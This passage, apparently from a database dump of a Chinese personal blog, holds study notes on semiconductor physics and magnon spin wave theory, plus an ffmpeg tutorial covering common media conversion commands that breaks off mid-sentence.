半导体中电子的加速度\r\n\r\n$$\r\n\\mathrm{d}E = f_外 \\mathrm{d}s = f_外 \\upsilon \\mathrm{d}t = f_外 \\frac{1}{h} \\frac{ \\mathrm{d}E }{ \\mathrm{d}k } \\cdot \\mathrm{d}t \\\\\r\n\\therefore \\frac{f_外}{h} = \\frac{ \\mathrm{d}k }{ \\mathrm{d}t } \\\\\r\na = \\frac{ \\mathrm{d}\\upsilon }{ \\mathrm{d}t } = \\frac{ \\mathrm{d} }{ \\mathrm{d}t }(\\frac{1}{h} \\frac{ \\mathrm{d}E }{ \\mathrm{d}k }) = \\frac{1}{h} \\frac{ \\mathrm{d}^2 E}{\\mathrm{d}k \\mathrm{d}t} = \\frac{1}{h} \\frac{ \\mathrm{d}^2 E}{ \\mathrm{d}k^2 } \\frac{ \\mathrm{d}k }{ \\mathrm{d}t } = f_外 \\frac{1}{h^2} \\frac{ \\mathrm{d}^2E }{ \\mathrm{d}^2k } = \\frac{ f_外 }{ m_n^* } \\\\\r\n\\therefore f_外 = m_n^* a\r\n$$\r\n\r\n### 有效质量的意义\r\n\r\n#### 有效质量概括了晶格内部势场的作用，使得研究半导体中电子的运动规律时，可以不涉及内部势场的作用，从而将外力和加速度直接联系起来，而==$m_n^*$可以用回旋共振实验测出==。\r\n\r\n#### 有效质量与能量函数与k的二次微商成反比：\r\n\r\n- #### 内层电子占据的能带较窄，电子的有效质量$m_n^*$比较大，在外力的作用下不易运动。\r\n\r\n- #### 外层电子占据的能带较宽，电子的有效质量$m_n^*$比较小，在外力的作用下可以获得较大的加速度。\r\n\r\n## 空穴\r\n\r\n#### 用少量空穴等效描述价带剩余大量电子对导电的贡献\r\n\r\n$$\r\n假设电流密度为J,则J = 价带(k状态空出)电子总电流 \\\\\r\n设想将一个电子填充到空的k状态 \\\\\r\nk状态电子的电流=(-q)v(k) \\\\\r\n填入后价带又被填满，总电流应为零 \\\\\r\nJ + (-q)v(k) = 0 \\\\\r\n\\therefore J = (+q)v(k)\r\n$$\r\n\r\n#### 空穴是一个等效的概念\r\n\r\n- #### 空穴带有与电子电荷量大小相等符号相反的$+q$电荷\r\n\r\n- #### 空穴的共有化运动速度就是价带顶附近空态中电子的共有化运动速度\r\n\r\n- #### 空穴的有效质量是一个正常数$m_p^*$其值与价带顶附近空态中的电子有效质量$m_n^*$大小相等符号相反\r\n\r\n- #### 空穴的浓度就是价带顶附近空态的浓度\r\n\r\n## 回旋共振\r\n\r\n$$\r\n一维下: \\\\\r\n设E_c位于导带底，极值位于k=0处：E(k) - E(c)= \\frac{h^2 k^2}{2 m_n^*} \\\\\r\n设E_v位于价带顶，极值位于k=0处：E(k) - E(v)= - \\frac{h^2 k^2}{2 m_p^*} \\\\\r\n三维下：\\\\\r\nE(k) - E(c) = \\frac{h^2}{2 m_n^*}(k_x^2 + k_y^2 + k_z^2) \\\\\r\n$$\r\n\r\n1. ### k空间等能面\r\n\r\n   #### 设$E(k)$为常数,在$k_x,k_y,k_z,$坐标中构成封闭的球面---称之为等能面\r\n\r\n   #### 实际晶体中导带极小值不一定在布里渊区中心，且有效质量$m_n^*$可以是各向异性的(E-k关系沿不同的方向不同)\r\n\r\n   #### 设导带极小值$E_c$位于$k_0$处，适当选取$k_x,k_y,k_z$轴且令$m_x^*,m_y^*,m_z^*$为沿三轴的有效质量。将$E_{(k)}$在$k_0$附近用泰勒级数展开，忽略高次项，得到\r\n\r\n   $$\r\n   E(k) - E(c) = \\frac{h^2(k_x - k_{0x}) ^2}{2 m_x^*} + \\frac{h^2(k_y - k_{0y}) ^2}{2 m_y^*} + \\frac{h^2(k_z - k_{0z}) ^2}{2 m_z^*} \\\\\r\n   其中 \\frac{1}{m_x^*} = \\frac{1}{h^2} (\\frac{\\partial^2 E}{\\partial k_x^2})_{k_0} \\quad \\frac{1}{m_y^*} = \\frac{1}{h^2} (\\frac{\\partial^2 E}{\\partial k_y^2})_{k_0} \\quad \\frac{1}{m_z^*} = \\frac{1}{h^2} (\\frac{\\partial^2 E}{\\partial k_z^2})_{k_0} \\\\\r\n   \\frac{(k_x - k_{0x}) ^2}{\\frac{2 m_x^* (E - E_c)}{h^2}} + \\frac{(k_y - k_{0y}) ^2}{\\frac{2 m_y^* (E - E_c)}{h^2}} + \\frac{(k_z - k_{0z}) ^2}{\\frac{2 m_z^* (E - E_c)}{h^2}} = 1 \\\\\r\n   当E=常数 \\Longrightarrow 椭球等能面 \\\\\r\n   若\\frac{2 m_x^* (E - E_c)}{h^2} , \\frac{2 m_y^* (E - E_c)}{h^2} , \\frac{2 m_z^* (E - E_c)}{h^2}中二者相等\\\\\r\n   \\Downarrow \\\\\r\n   旋转椭球等能面\r\n   $$\r\n\r\n   #### 具有旋转椭球等能面的$E-k$关系，其电子的有效质量是各项异性的\r\n\r\n2. ### 回旋共振\r\n\r\n   #### 设将一个半导体样品置于均匀恒定的磁场中。磁感应强度$\\vec{B}$。电子的初速度$\\vec{\\upsilon}$，且$\\vec{\\upsilon}$与$\\vec{B}$夹角为$\\theta$。\r\n\r\n   $$\r\n   电子受到洛伦兹力的作用 \\\\\r\n   \r\n   作用力大小|f|=q \\upsilon B \\sin \\theta \\\\\r\n   \r\n   f的方向\\vec{f} = -q \\vec{\\upsilon} \\times \\vec{B} \\\\\r\n   \r\n   将速度\\vec{\\upsilon}分解到与\\vec{B}平行方向\\upsilon_{//}及与\\vec{B}垂直方向\\upsilon_{\\bot} \\\\\r\n   \\therefore \\upsilon_{//} = \\upsilon \\cos \\theta,\\upsilon_{\\bot} = \\upsilon \\sin \\theta \\\\\r\n   电子轨迹：\\\\\r\n   在与\\vec{B}平行方向以\\upsilon_{//} = \\upsilon \\cos \\theta速度匀速运动 \\\\\r\n   在与\\vec{B}垂直方向\\upsilon_{\\bot} = \\upsilon \\sin \\theta为线速度作圆周运动\\\\\r\n   \\Downarrow \\\\\r\n   螺旋线 \\\\\r\n   设回旋频率\\omega_c,回旋半径r,则\\upsilon_{\\bot} = \\omega_c r \\\\\r\n   向心加速度 a = \\frac{\\upsilon_{\\bot}^2}{r} = \\frac{q \\upsilon B \\sin \\theta}{m_n^*} = \\frac{q \\upsilon_{\\bot} B}{m_n^*} \\\\\r\n   \\therefore \\omega_c = \\frac{qB}{m_n^*} \\\\\r\n   根据回旋共振吸收测出\\omega_c即得有效质量m_n^*(针对各向同性)\\\\\r\n   若各向异性 \\\\\r\n   设沿k_x,k_y,k_z坐标轴的有效质量分别为m_x^*,m_y^*,m_z^* \\\\\r\n   且磁感应强度\\vec{B}在k_x,k_y,k_z轴上的方向余弦分别为\\alpha,\\beta,\\gamma \\\\\r\n   \\alpha = \\cos\\theta_1,\\beta = \\cos\\theta_2,\\gamma = \\cos\\theta_3 \\\\\r\n   电子受力\\vec{f} = f_x\\vec{i} + f_y\\vec{j} + f_z\\vec{k} = -q\\vec{\\upsilon} \\times \\vec{B} = -q(\\upsilon_x \\vec{i} + \\upsilon_y \\vec{j} + \\upsilon_z \\vec{k}) \\times (B\\alpha\\vec{i} + B\\beta\\vec{j} + B\\gamma\\vec{k}) \\\\\r\n   展开后对应分量相等 \\\\\r\n   \\begin{cases}\r\n   f_x = -qB(\\upsilon_y \\gamma - \\upsilon_z \\beta) \\\\\r\n   f_y = -qB(\\upsilon_z \\alpha - \\upsilon_x \\gamma) \\\\\r\n   f_z = -qB(\\upsilon_x \\beta - \\upsilon_y \\alpha) \r\n   \\end{cases}\\\\\r\n   \\therefore 电子的运动方程为：\\\\\r\n   \\begin{cases}\r\n   m_x^* \\frac{\\mathrm{d}\\upsilon_x}{\\mathrm{d}t} + qB(\\upsilon_y \\gamma - \\upsilon_z \\beta) = 0 \\\\\r\n   m_y^* \\frac{\\mathrm{d}\\upsilon_y}{\\mathrm{d}t} + qB(\\upsilon_z \\alpha - \\upsilon_x \\gamma) = 0 \\\\\r\n   m_z^* \\frac{\\mathrm{d}\\upsilon_z}{\\mathrm{d}t} + qB(\\upsilon_x \\beta - \\upsilon_y \\alpha) = 0 \r\n   \\end{cases} \\\\\r\n   电子应做周期性运动，取周期性试解： \\\\\r\n   \\begin{cases}\r\n   \\upsilon_x = \\upsilon_x\' e^{i \\omega_c t} \\\\\r\n   \\upsilon_y = \\upsilon_y\' e^{i \\omega_c t} \\\\\r\n   \\upsilon_z = \\upsilon_z\' e^{i \\omega_c t} \r\n   \\end{cases} \\\\\r\n   代入得： \\\\\r\n   \\begin{cases}\r\n   \\quad i\\omega_c\\upsilon_x\' + \\frac{qB}{m_x^*}\\gamma\\upsilon_y\' - \\frac{qB}{m_x^*}\\beta\\upsilon_z\' = 0 \\\\\r\n   -\\frac{qB}{m_y^*}\\gamma\\upsilon_x\' + i\\omega_c\\upsilon_y\' + \\frac{qB}{m_y^*}\\alpha\\upsilon_z\' = 0 \\\\\r\n   \\quad \\frac{qB}{m_z^*}\\beta\\upsilon_x\' - \\frac{qB}{m_z^*}\\alpha\\upsilon_y\' + i\\omega_c\\upsilon_z\' = 0 \r\n   \\end{cases} \\\\\r\n   要使\\upsilon_x\',\\upsilon_y\',\\upsilon_z\'有异于零的解，系数行列式应为零： \\\\\r\n   	\\begin{vmatrix}\r\n      i\\omega_c & \\frac{qB}{m_x^*}\\gamma & -\\frac{qB}{m_x^*}\\beta \\\\\r\n      -\\frac{qB}{m_y^*}\\gamma & i\\omega_c & \\frac{qB}{m_y^*}\\alpha \\\\\r\n      \\frac{qB}{m_z^*}\\beta & -\\frac{qB}{m_z^*}\\alpha & i\\omega_c\r\n    	\\end{vmatrix} = 0 \\\\\r\n    由此可解得电子的回旋频率\\omega_c为： \\\\\r\n    \\omega_c = \\frac{qB}{m_n^*} \\\\\r\n    式中,m_n^*为： \\\\\r\n    \\frac{1}{m_n^*} = \\sqrt{ \\frac{ m_x^*\\alpha^2 + m_y^*\\beta^2 + m_z^*\\gamma^2 }{ m_x^* m_y^* m_z^* } } \\\\\r\n    当交变电磁场的频率\\omega与\\omega_c相同时，就得到共振吸收\r\n   $$\r\n\r\n## 硅和锗的能带结构\r\n\r\n# 半导体中杂质和缺陷能级\r\n\r\n## 替为式杂质和间隙式杂质\r\n\r\n### Ⅲ、Ⅴ族元素在硅、锗晶体中是替为式杂质\r\n\r\n## 施主杂质、施主能级\r\n\r\n#### 例：硅中参磷，一个磷原子占据了硅原子的位置，其五个价电子中四个与周围四个硅原子形成共价键，同时磷原子所在处剩余一个正电中心$P^+$和一个多余的价电子。\r\n\r\n#### 这个多余的价电子就束缚在正电中心$P^+$周围，但这种束缚比共价键要弱，只要很小的能量就能挣脱束缚使价电子成为导电电子。\r\n\r\n#### 因为Ⅴ族杂质在硅、锗中能够释放电子而产生导电电子，并形成正电中心，所以称它们为施主杂质或n型杂质。\r\n\r\n#### ==上述电子脱离杂质原子的束缚成为导电电子的过程称为杂质电离。挣脱束缚所需的能量称为施主杂质的电离能，用$\\Delta E_D$表示。==\r\n\r\n### 在纯净半导体中掺入施主杂质，杂质电离以后，导带中的导电电子增多，提高了半导体的导电能力。通常把主要依靠导带电子导电的半导体称为电子型或==n型半导体==。将==被施主杂质束缚的电子的能量状态称为施主能级==，记为$E_D$。\r\n\r\n## 受主杂质、受主能级\r\n\r\n#### 例：硅中参硼，一个硼原子占据了硅原子的位置，其三个价电子与周围四个硅原子形成共价键时，还缺少一个电子，必须从别的硅原子中夺取一个价电子，于是硼原子所在处形成一个负电中心$B^-$和一个空穴。\r\n\r\n#### 由于静电作用，带正电的空穴受到$B^-$的束缚，在附近运动。不过这种束缚是很弱的，只要很小的能量就能挣脱束缚使空穴成为导电空穴。\r\n\r\n#### 因为Ⅲ族杂质在硅、锗中能够接收电子而产生空穴导电，并形成负电中心，所以称它们为受主杂质或p型杂质。\r\n\r\n#### ==空穴挣脱受主杂质的过程称为受主电离。空穴挣脱束缚所需的能量称为受主杂质的电离能，用$\\Delta E_A$表示。==\r\n\r\n### 在纯净半导体中掺入受主杂质，杂质电离以后，价带中的导电空穴增多，提高了半导体的导电能力。通常把主要依靠空穴导电的半导体称为空穴型或==p型半导体==。将==被受主杂质束缚的空穴的能量状态称为受主能级==，记为$E_A$。\r\n\r\n### 施主能级比导带底低$\\Delta E_D$，受主能级比价带顶高$\\Delta E_A$。因为其电离能都比较小，通常将这些杂质能级称为浅能级，将产生浅能级的杂质称为浅能级杂质。\r\n\r\n## 浅能级杂质电离能的简单计算\r\n\r\n### 类氢模型：\r\n\r\n$$\r\n\r\n$$\r\n\r\n## 杂质的补偿作用\r\n\r\n### 当半导体中即掺入施主杂质，又掺入受主杂质时（向同一区域），则施主杂质和受主杂质具有相互抵消的作用---杂质的补偿作用\r\n\r\n#### 设施主杂质浓度$N_D(cm)^{-3}$,受主杂质浓度$N_A(cm)^{-3}$，导带电子浓度$n(cm)^{-3}$，价带空穴浓度$p(cm)^{-3}$\r\n\r\n1. ### $N_D \\gg N_A$\r\n\r\n   #### 导带电子浓度$n = N_D - N_A \\approx N_D$\r\n\r\n   #### 有效施主浓度：$N_D - N_A$\r\n\r\n   #### n型半导体\r\n\r\n2. ### $N_A \\gg N_D$\r\n\r\n   #### 价带空穴浓度$p = N_A -N_D \\approx N_A$\r\n\r\n   #### 有效受主浓度：$N_A -N_D$\r\n\r\n   #### p型半导体\r\n\r\n3. ### $N_D \\approx N_A$\r\n\r\n   #### 过度补偿 不适宜制造半导体器件\r\n\r\n## 深能级杂质\r\n\r\n1. ### 非Ⅲ、Ⅴ族\r\n\r\n   ### 施主能级$E_D$距离导带底$E_c$很远\r\n\r\n   ### 受主能级$E_A$距离价带顶$E_v$很远\r\n\r\n   ### 这样的能级称为深能级 这样的杂质称为深能级杂质\r\n\r\n2. ### 深能级杂质可以产生多次电离，每一次电离相应的有一个能级，所以这些杂质在硅和锗的禁带中往往引入若干个能级，并且有的杂质即引入施主能级又引入受主能级\r\n\r\n3. ### 深能级杂质主要是替位式杂质\r\n\r\n## Ⅲ-Ⅴ族化合物中的杂质能级\r\n\r\n## 缺陷、位错能级\r\n\r\n1. ### 点缺陷\r\n\r\n   - #### 肖特基缺陷\r\n\r\n   - #### 弗伦克尔缺陷\r\n\r\n2. ### 位错\r\n\r\n# 半导体中载流子的统计分布\r\n\r\nto be continue······\r\n\r\n# 半导体的导电性\r\n\r\n\r\nto be continue······\r\n\r\n\r\n# 金属和半导体的接触\r\n\r\n## 金属和半导体的功函数\r\n\r\n### 金属内部的电子是在一个势阱中运动\r\n\r\n### $E_0$：真空能级\r\n\r\n### 金属功函数：$W_m = E_0 - （E_F）_m$\r\n\r\n#### 金属中起始能量等于费米能级的电子激发到真空能级所需能量\r\n\r\n### 半导体功函数：$W_s = E_0 - （E_F）_s$\r\n\r\n#### 半导体费米能级（==参考能级==）电子激发到真空能级所需能量\r\n\r\n### 电子亲和能：$\\chi = E_0 - E_c$\r\n\r\n#### 导带底电子激发到真空能级所需能量\r\n\r\n### 利用电子亲和能，半导体的功函数又可以表示为：$W_S = \\chi +[E_c - (E_F)_s] = \\chi + E_n \\quad E_n = E_c - (E_F)_s$\r\n\r\n## 接触电势差\r\n\r\n### 接触电势差\r\n\r\n#### $V_{ms} = V_m - V_s\' = \\frac{W_s - W_m}{q}$\r\n\r\n### 表面势\r\n\r\n#### 随着D的减小，靠近半导体一侧的金属表面负电荷密度增大，同时，靠近金属一侧的半导体表面的正电荷密度也随之增大，即空间电荷区。这时在空间电荷区内便存在一定的电场，造成能带弯曲，使半导体表面和内部之间存在电势差$V_s$，即表面势。这时接触电势差一部分降落在空间电荷区，另一部分降落在金属和半导体表面之间，于是有：$\\frac{W_s -W_m}{q} = V_{ms} + V_s$。当D小到可以忽略时，$\\frac{W_s -W_m}{q} =  V_s$。\r\n\r\n### 势垒高度\r\n\r\n#### 半导体一边：$qV_D = -qV_s =W_m - W_s$\r\n\r\n#### 金属一边：$q\\phi_{ns} = W_m - \\chi$\r\nto be continue······','2023-12-26 21:08:29','2024-04-10 22:49:59'),(100011,100007,'MnF2中的壳层异常','\r\n__Spurious Symmetry Enhancement in Linear Spin Wave Theory and Interaction-Induced Topology in Magnons__[^1]笔记\r\n\r\n**BinWang**\r\n\r\n__Content__\r\n\r\n[TOC]\r\n\r\n# 线性自旋波理论（LSWT）\r\n\r\n## Heisenberg model（海森堡模型）\r\n\r\n根据量子力学，两电子体系之间的交换能可以写出如下，\r\n$$\r\nE_{ex}=\\pm\r\n\\iint\\psi_1 (\\vec{r_1})\\psi_2(\\vec{r_2})\r\nV(r_{12})\r\n\\psi_1 (\\vec{r_2}) \\psi_2 (\\vec{r_1})\r\nd\\vec{r_1}\\vec{r_2}\r\n$$\r\n\r\n\r\n\r\n其中 $ V(r_{12})$为电子之间的库仑势。\r\n\r\n根据量子力学（二次量子化标准手续可以推导），系统关于交换能的哈密顿量 $\\hat{H}$可以写为\r\n$$\r\n\\hat{H}=-2\\sum_{i > j}J_{ij}\\;\\hat{S_i}\\bullet\\hat{S_j}\\qquad(1)\r\n$$\r\n\r\n(1)式即海森堡模型的标准哈密顿量，$J_{ij}$为两个自旋间的交换积分,$\\hat{S}_{i(j)}$​为某一晶格的自旋算符。\r\n\r\n## Holstein-Primakoff变换\r\n\r\n> 利用HP变换，可以把（1）式转化为用产生湮灭算符表达的形式\r\n\r\n为简化计算，首先我们只考虑临近格子间的交换作用，即\r\n$$\r\n\\hat{H}=-J\\sum_{i ,\\delta}\\;\\hat{S_i}\\bullet\\hat{S}_{i+\\delta}\\qquad(2)\r\n$$\r\n由（1）式得到（2）式我们认为同一晶格的临近作用的交换积分相同，且（1）中的求和限制$i>j$被我们用÷2的方式去掉\r\n\r\n> 注意，对于不同的$\\delta$求和会有不同的交换积分，具体与晶格对称性有关\r\n\r\n接下来我们把（2）式写成自旋分量的形式\r\n$$\r\n\\hat{H}=-J\\sum_{i ,\\delta}\\;\r\n(\\hat{S^z_i}\\hat{S^z}_{i+\\delta}+\\frac{1}{2}(\\hat{S^+_i}\\hat{S^-}_{i+\\delta}+\\hat{S^-_i}\\hat{S^+}_{i+\\delta})\\qquad(3)\r\n$$\r\n其中$\\hat{S^+}$ 和$\\,\\,\\hat{S^-}$是角动量本征态的上升与下降算符\r\n$$\r\n\\hat{S}^+=\\hat{S}_x+i\\hat{S}_y\r\n\\qquad\\qquad\r\n\\hat{S}^-=\\hat{S}_x-i\\hat{S}_y\r\n$$\r\n在低温情况下，对于铁磁体有$J>0$, 所以铁磁体的基态为所有的自旋朝一个方向，故表现出宏观磁性，由于$\\hat{S^+}$ 和$\\,\\,\\hat{S^-}$会导致角动量本征矢的z分量上升或下降，即导致某个自旋产生偏移，而这种偏移通过交换作用会传递至所有的晶格，即形成自旋波，所以由这个角度出发，引入$n$,即偏移量的计数，且有$n\\equiv S-m$,根据量子力学角动量理论（此处省略证明），$n=a^{\\dagger}a$, 我们直接写出HP变换\r\n$$\r\n\\hat{S^+}=(\\sqrt{2S-a^{\\dagger}a})a\\qquad(4.1)\r\n\\\\\r\n\\hat{S^-}=a^{\\dagger}(\\sqrt{2S-a^{\\dagger}a})\\qquad(4.2)\r\n\\\\\r\n\\hat{S^z}=(S-a^{\\dagger}a)\\qquad(4.3)\r\n$$\r\n(4)式即HP变换，代入（3）中，在低温下n很小，所以可以将根号展开取线性近似，忽略四次项可得自旋波的表示式。\r\n\r\n## Model A ：MnF2 晶体中的壳层异常\r\n晶格结构如下\r\n![](https://www.zhuguishihundan.cn/image/17b998fe919b8826.png)![](https://www.zhuguishihundan.cn/image/17b9992105aaac35.png)\r\n![](https://www.zhuguishihundan.cn/image/17b9992d980181fc.png)\r\n![](https://www.zhuguishihundan.cn/image/17b99930d1ad6cdd.png)\r\n![](https://www.zhuguishihundan.cn/image/17b999331c7762f4.png)\r\n![](https://www.zhuguishihundan.cn/image/17b999353753709a.png)\r\n\r\n用Matlab绘图可以得到\r\n![](https://www.zhuguishihundan.cn/image/17b9993c4dcedbb9.png)\r\n对于$\\Gamma\\to M\'$则是红线与蓝线互换，原来简并的两支自旋波由于次近邻的相互作用而发生消除简并。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n[^1]: 线性自旋波理论中的伪对称增强和磁振子的相互作用诱导拓扑','2024-03-04 23:05:38','2024-03-04 23:27:07'),(100012,100008,'About ffmpeg','# 在终端中使用ffmpeg完成音频转换\r\n\r\n## 1. 什么是ffempeg\r\nFFmpeg 是领先的多媒体框架，能够解码、编码、转码、复用、解复用、流式传输、过滤和播放人类和机器创建的几乎任何内容。它支持最晦涩的古代格式直至最前沿。无论它们是由某个标准委员会、社区还是公司设计的。它还具有高度可移植性：FFmpeg 在 Linux、Mac OS X、Microsoft Windows、BSD、Solaris 等各种构建环境、机器架构和配置下编译、运行并通过我们的测试基础设施 FATE。\r\n\r\n## 2. 下载 ffmpeg\r\n### For macOS\r\n\r\n#### 方法1\r\n\r\n利用包管理器 homebrew 下载ffmpeg\r\n```\r\nbrew install ffmpeg\r\n```\r\n下载成功后可以输入以下指令查看ffmpeg版本\r\n```\r\nffmpeg -version\r\n```\r\n\r\n卸载ffmpeg\r\n```\r\nbrew uninstall ffmpeg\r\n```\r\n\r\n#### 方法2\r\n\r\n不用homebrew \r\n\r\n有这么好的包管理器你不用，非要原始方法，帮不了你了，自己去网上找 😇😇😇\r\n\r\n[点此前往](https://blog.51cto.com/aiyc/5151109)\r\n\r\n\r\n### For Windows\r\n\r\n我是mac 自己找教程 🫣🫣🫣\r\n\r\n\r\n## 3.ffmpeg 工作原理\r\nfmpeg 中每个输出的转码过程可以用下图描述：\r\n![](https://www.zhuguishihundan.cn/image/17bbbe0232b388c1.png)\r\n\r\n***\r\n\r\nmuxer：合并文件，即将视频文件、音频文件和字幕文件合并为某一个视频格式。比如把rmvb格式的视频，mp3格式的音频文件以及srt格式的字幕文件，合并成为一个新的mp4或者mkv格式的文件。\r\n\r\ndemuxer：muxer的逆过程，就是把合成的文件中提取出不同的格式文件。\r\n***\r\n\r\n\r\nffmpeg 调用 libavformat 库（包含解复用器）来读取输入文件并从中获取包含编码数据的数据包。当有多个输入文件时， ffmpeg 尝试通过跟踪任何活动输入流上的最低时间戳来保持它们同步。然后，编码的数据包被传递到解码器。解码器生成未压缩的帧（原始视频/PCM 音频/...），可以通过过滤进一步处理。过滤后，帧被传递到编码器，编码器对它们进行编码并输出编码后的数据包。最后，这些被传递到复用器，复用器将编码的数据包写入输出文件。\r\n\r\n## 4. ffmpeg 常用指令\r\n\r\n### 4.1 获取媒体文件信息\r\n```\r\nffmpeg -i [文件名]\r\n\r\n```\r\n![](https://www.zhuguishihundan.cn/image/17bbe6ff8331aa69.png)\r\n\r\n上面都是ffmpeg本身的信息，如果不想看可以用👇指令隐藏\r\n```\r\nffmpeg -i [文件名] -hide_banner \r\n```\r\n\r\n### 4.2 转换媒体文件\r\n```\r\nffmpeg -i [源文件] [目标文件1] [目标文件2]...\r\n```\r\n==ffmpeg 会从后缀名猜测格式，转换成目标格式==\r\n\r\n例子：\r\n```\r\nffmpeg -i shin.mp3 shin.ogg shin.flac\r\n```\r\n此处将mp3格式转换成ogg/flac文件\r\n\r\n```\r\nffmpeg -i TooSmart.mp4  TooSmart.mov\r\n```\r\n此处将mp4格式转换成mov文件\r\n\r\n### 4.3 将视频转换成音频\r\n为了从视频文件中抽取音频，直接加一个 -vn 参数就可以了\r\n```\r\nffmpeg -i TooSmart.mp4  TooSmart.mp3\r\n```\r\n这会让命令复用原有文件的比特率，一般来说，使用 -ab (音频比特率)来指定编码比特率是比较好的：\r\n\r\nffmpeg -i video.mp4 -vn -ab 128k audio.mp3\r\n一些常见的比特率有 96k, 128k, 192k, 256k, 320k (mp3也可以使用最高的比特率)。\r\n\r\n其他的一些常用的参数比如 -ar (采样率: 22050, 441000, 48000), -ac (声道数), -f (音频格式, 通常会自动识别的). -ab 也可以使用 -b:a 来替代. 比如：\r\n```\r\nffmpeg -i TooSmart.mp4 -vn -ar 44100 -ac 2 -b:a 128k -f mp3 TooSmart.mp3\r\n```\r\n\r\n### 4.4 将视频禁音，4.3是将音频单独抽取出来，此处将视频抽取出来\r\n```\r\nffmpeg -i TooSmart.mp4 -an TooSmart1.mp4\r\n```\r\n\r\n### 4.5 从视频中提取图片\r\n这个功能可能对很多人都挺有用，比如你可能有一些幻灯片，你想从里面提取所有的图片，那么下面这个命令就能帮你：\r\n\r\n```\r\nffmpeg -i video.mp4 -r 1 -f image2 image-%3d.png\r\n```\r\n\r\n我们来解释一下这个命令：\r\n\r\n-r 代表了帧率（一秒内导出多少张图像，默认25）， -f 代表了输出格式(image2 实际上上 image2 序列的意思）。\r\n\r\n最后一个参数 (输出文件) 有一个有趣的命名：它使用 %3d 来指示输出的图片有三位数字 (000, 001, 等等.)。你也可以用 %2d (两位数字) 或者 %4d (4位数字) ，只要你愿意，你可以随便实验 一下可以怎么写！\r\n\r\n### 4.6 更改视频分辨率或长宽比\r\n对 ffmpeg 来说又是个简单的任务，你只需要使用 -s 参数来缩放视频就行了:\r\n```\r\nffmpeg -i video_input.mov -s 1024x576 video_output.mp4\r\n```\r\n同时，你可能需要使用 -c:a 来保证音频编码是正确的:\r\n```\r\nffmpeg -i video_input.h264 -s 640x480 -c:a video_output.mov\r\n```\r\n你也可是使用-aspect 来更改长宽比:\r\n```\r\nffmpeg -i video_input.mp4 -aspect 4:3 video_output.mp4\r\n```\r\n\r\n### 4.7 为音频增加封面图片\r\n有个很棒的方法把音频变成视频，全程使用一张图片（比如专辑封面）。当你想往某个网站上传音频，但那个网站又仅接受视频（比如YouTube, Facebook等）的情况下会非常有用。\r\n\r\n下面是例子：\r\n```\r\nffmpeg -loop 1 -i image.jpg -i audio.wav -c:v libx264 -c:a aac -strict experimental -b:a 192k -shortest output.mp4\r\n```\r\n只要改一下编码设置 (-c:v 是 视频编码， -c:a 是音频编码) 和文件的名称就能用了。\r\n\r\n\r\n### 4.8 为视频增加字幕\r\n另一个常见又很容易实现的要求是给视频增加字母，比如一部外文电源，使用下面的命令：\r\n```\r\nffmpeg -i video.mp4 -i subtitles.srt -c:v copy -c:a copy -preset veryfast -c:s mov_text -map 0 -map 1 output.mp4\r\n```\r\n当然，你可以指定自己的编码器和任何其他的音频视频参数。\r\n\r\n### 4.9 压缩媒体文件\r\n压缩文件可以极大减少文件的体积，节约存储空间，这对于文件传输尤为重要。通过ffmepg，有好几个方法来压缩文件体积。\r\n\r\n首先，对于音频文件，可以通过降低比特率(使用 -b:a 或 -ab):\r\n```\r\nffmpeg -i audio_input.mp3 -ab 128k audio_output.mp3\r\nffmpeg -i audio_input.mp3 -b:a 192k audio_output.mp3\r\n```\r\n再次重申，一些常用的比特率有: 96k, 112k, 128k, 160k, 192k, 256k, 320k.值越大，文件所需要的体积就越大。\r\n\r\n对于视频文件，选项就多了，一个简单的方法是通过降低视频比特率 (通过 -b:v):\r\n```\r\nffmpeg -i video_input.mp4 -b:v 1000k -bufsize 1000k video_output.mp4\r\n```\r\n\r\n你也可以使用 -crf 参数 (恒定质量因子). 较小的crf 意味着较大的码率。同时使用 libx264 编码器也有助于减小文件体积。这里有个例子，压缩的不错，质量也不会显著变化：\r\n```\r\nffmpeg -i video_input.mp4 -c:v libx264 -crf 28 video_output.mp4\r\n```\r\ncrf 设置为20 到 30 是最常见的，不过您也可以尝试一些其他的值。\r\n\r\n降低帧率在有些情况下也能有效（不过这往往让视频看起来很卡）:\r\n```\r\nffmpeg -i video_input.mp4 -r 24 video_output.mp4\r\n```\r\n-r 指示了帧率 (这里是 24)。\r\n\r\n你还可以通过压缩音频来降低视频文件的体积，比如设置为立体声或者降低比特率：\r\n```\r\nffmpeg -i video_input.mp4 -c:v libx264 -ac 2 -c:a aac -strict -2 -b:a 128k -crf 28 video_output.mp4\r\n```\r\n\r\n### 4.10 裁剪媒体文件（基础）\r\n想要从开头开始剪辑一部分，使用T -t 参数来指定一个时间:\r\n```\r\nffmpeg -i input_video.mp4 -t 5 output_video.mp4 \r\nffmpeg -i input_audio.wav -t 00:00:05 output_audio.wav\r\n```\r\n这个参数对音频和视频都适用，上面两个命令做了类似的事情：保存一段5s的输出文件（文件开头开始算）。上面使用了两种不同的表示时间的方式，一个单纯的数字（描述）或者 HH:MM:SS (小时, 分钟, 秒). 第二种方式实际上指示了结束时间。\r\n\r\n也可以通过 -ss 给出一个开始时间，-to 给出结束时间：\r\n```\r\nffmpeg -i input_audio.mp3 -ss 00:01:14 output_audio.mp3\r\nffmpeg -i input_audio.wav -ss 00:00:30 -t 10 output_audio.wav \r\nffmpeg -i input_video.h264 -ss 00:01:30 -to 00:01:40 output_video.h264 \r\nffmpeg -i input_audio.ogg -ss 5 output_audio.ogg\r\n```\r\n可以看到 开始时间 (-ss HH:MM:SS), 持续秒数 (-t duration), 结束时间 (-to HH:MM:SS), 和开始秒数 (-s duration)的用法.\r\n\r\n你可以在媒体文件的任何部分使用这些命令。\r\n\r\n## 5 ffmpeg高级使用\r\n现在该开始讲述一些高级的特性了（比如截屏等），让我们开始吧。\r\n\r\n### 5.1 分割媒体文件\r\n前面已经讲述了如何裁剪文件，那么如何分割媒体文件呢？只需要为每个输出文件分别指定开始时间、结束或者持续时间就可以了。\r\n\r\n看下面这个例子：\r\n```\r\nffmpeg -i video.mp4 -t 00:00:30 video_1.mp4 -ss 00:00:30 video_2.mp4\r\n```\r\n语法很简单，为第一个文件指定了 -t 00:00:30 作为持续时间（第一个部分是原始文件的前30秒内容），然后指定接下来的所有内容作为第二个文件（从第一部分的结束时间开始，也就是 